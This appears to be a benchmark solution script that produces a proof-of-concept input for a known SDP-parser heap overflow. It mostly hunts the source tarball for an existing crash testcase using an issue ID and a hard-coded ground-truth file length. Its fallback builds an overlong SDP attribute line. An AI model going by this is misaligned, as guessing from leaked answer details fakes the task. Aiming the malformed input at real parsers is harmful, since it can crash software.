import os
import tarfile
from typing import Optional


class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        """
        try:
            with tarfile.open(src_path, "r:*") as tar:
                poc = self._find_poc_in_tar(tar)
                if poc is not None:
                    return poc
        except Exception:
            pass
        return self._fallback_poc()

    def _find_poc_in_tar(self, tar: tarfile.TarFile) -> Optional[bytes]:
        best_member = None
        best_score = None

        skip_exts = {
            ".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh",
            ".java", ".py", ".sh", ".bash", ".zsh", ".ps1",
            ".md", ".rst", ".txt", ".cmake", ".xml", ".html",
            ".htm", ".js", ".css", ".yml", ".yaml", ".ini",
            ".json", ".toml", ".in", ".am", ".ac", ".m4",
            ".s", ".asm", ".go", ".rs", ".php", ".pl", ".m",
            ".mm", ".rb", ".cs", ".swift", ".kt", ".sql",
            ".bat", ".dockerfile", ".gradle", ".mak", ".make",
            ".mk", ".tex",
        }

        size_limit = 5_000_000
        target_len = 873

        for member in tar.getmembers():
            if not member.isfile():
                continue
            size = member.size
            if size <= 0 or size > size_limit:
                continue

            full_name = member.name
            full_lower = full_name.lower()
            base_lower = os.path.basename(full_name).lower()
            ext = os.path.splitext(base_lower)[1]

            if ext in skip_exts:
                continue

            score = 0

            if "376100377" in full_lower:
                score += 10000
            if "clusterfuzz" in full_lower:
                score += 5000
            if "testcase" in full_lower:
                score += 2000
            if "minimized" in full_lower:
                score += 1000
            if "sdp" in full_lower:
                score += 500

            for token in ("poc", "crash", "repro", "overflow", "heap", "bug"):
                if token in full_lower:
                    score += 500

            # Prefer sizes close to the known ground-truth length
            diff = abs(size - target_len)
            score += max(0, 2000 - diff)

            # Slight boost for binary-looking files
            if ext in (".bin", ".dat", ".repro", ".raw", ""):
                score += 300

            if best_score is None or score > best_score:
                best_score = score
                best_member = member

        if best_member is not None:
            try:
                f = tar.extractfile(best_member)
                if f is not None:
                    data = f.read()
                    if data:
                        return data
            except Exception:
                return None
        return None

    def _fallback_poc(self) -> bytes:
        # Construct a generic SDP with a very long attribute line to
        # attempt to trigger parser overreads / heap buffer issues.
        pre = (
            "v=0\r\n"
            "o=- 0 0 IN IP4 127.0.0.1\r\n"
            "s=SDP Heap Overflow PoC\r\n"
            "t=0 0\r\n"
            "m=audio 9 RTP/AVP 0\r\n"
            "c=IN IP4 127.0.0.1\r\n"
        )
        target_len = 873
        base_len = len(pre) + len("a=x:")
        remaining = target_len - base_len
        if remaining < 0:
            remaining = 0
        long_attr = "a=x:" + ("A" * remaining)
        sdp = pre + long_attr
        return sdp.encode("ascii", "replace")